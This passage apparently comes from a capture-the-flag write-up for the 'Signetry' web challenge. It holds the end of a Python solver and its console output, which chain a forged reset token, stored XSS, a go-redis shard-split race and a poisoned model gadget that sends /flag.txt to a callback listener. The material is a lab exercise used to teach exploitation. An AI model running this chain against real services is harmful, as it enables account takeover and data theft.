def attempt(gw, model, staff, curator):
    """Run one stage, withdraw, and finalize attempt."""
    # Register the poisoned model with the maintainer session.
    st, body = http("POST", f"{gw}/stage", data=model, ctype="application/zip", extra=staff)
    if st != 200:
        return None
    token = json.loads(body)["token"]
    # Trigger the cross-shard deletion with the maintainer session.
    http("POST", f"{gw}/withdraw", data=json.dumps({"token": token}).encode(), extra=staff)
    # Finalize with the curator session if the model blob survived.
    st, body = http("POST", f"{gw}/finalize", data=json.dumps({"token": token}).encode(), extra=curator)
    return st, body, token


def solve(gw, model_path, lhost, lport, max_attempts=60):
    """Run the four exploit stages and return the flag."""
    listener = start_listener(lport)
    with open(model_path, "rb") as f:
        model = patch_model(f.read(), lhost, lport)
    print(f"[*] gadget will exfil /flag.txt to {lhost}:{lport}")

    staff = takeover(gw)
    curator = client_takeover(gw, staff)

    print("[*] exploiting go-redis Ring cross-shard DEL (retry until keys shard apart)")
    fired = False
    for i in range(1, max_attempts + 1):
        r = attempt(gw, model, staff, curator)
        if r and r[0] == 202:
            print(f"[+] attempt {i}: shard split hit, model relayed to /certify")
            fired = True
            break
        # 404 = blob shared the first key's shard (deleted); 403 = a marker survived. retry.
    if not fired:
        raise RuntimeError("never hit a favorable shard split; increase --attempts")

    print("[*] waiting for the gadget to call back with the flag...")
    flag = listener.get(timeout=45)
    if not flag:
        raise TimeoutError("no callback received; check --lhost reachability from the target")
    return flag


def autodetect_lhost():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def main():
    parser = argparse.ArgumentParser(description="Signetry four-stage Web challenge solver")
    parser.add_argument("--host", default="localhost", help="Gateway host (default: localhost)")
    parser.add_argument("--port", type=int, default=4000, help="Gateway port (default: 4000)")
    parser.add_argument("--lhost", default=None, help="Callback host the gadget connects back to (default: auto-detect)")
    parser.add_argument("--lport", type=int, default=9001, help="Callback port the solver listens on (default: 9001)")
    parser.add_argument("--model", default=DEFAULT_MODEL, help="Poisoned model zip to stage")
    parser.add_argument("--attempts", type=int, default=60, help="Max stage/withdraw/finalize retries")
    parser.add_argument("--debug", action="store_true", help="Verbose tracebacks")
    args = parser.parse_args()

    if not os.path.isfile(args.model):
        print(f"[!] poisoned model not found: {args.model}", file=sys.stderr)
        sys.exit(2)

    gw = f"http://{args.host}:{args.port}"
    lhost = args.lhost or autodetect_lhost()
    try:
        flag = solve(gw, args.model, lhost, args.lport, args.attempts)
        print(f"\n[+] Flag: {flag}")
        sys.exit(0)
    except Exception as e:
        if args.debug:
            raise
        print(f"\n[!] Failed: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

</details>

### Getting the flag
Running the validated solver starts the callback listener and executes all four stages. The final local test completed on the first Redis placement attempt:

```console
$ python3 htb/solver.py --host localhost --port 4000 --lhost 172.0.1.1 --lport 9001
[*] gadget will exfil /flag.txt to 172.0.1.1:9001
[*] forging a qor/auth reset token for dms@htb.com (empty signing secret)
[*] logging in with the new password
[+] session established, whoami: {"role":"maintainer","sub":"dms@htb.com"}
[*] submitting stored XSS appeal (custom-element onanimationstart)
[*] uploading type map and dispatching the Warden through an internal redirect
[*] waiting 10s for the Warden to triage the queue
[+] curator session established, whoami: {"role":"curator","sub":"conservator@htb.com"}
[*] exploiting go-redis Ring cross-shard DEL (retry until keys shard apart)
[+] attempt 1: shard split hit, model relayed to /certify
[*] waiting for the gadget to call back with the flag...

[+] Flag: HTB{...}
```
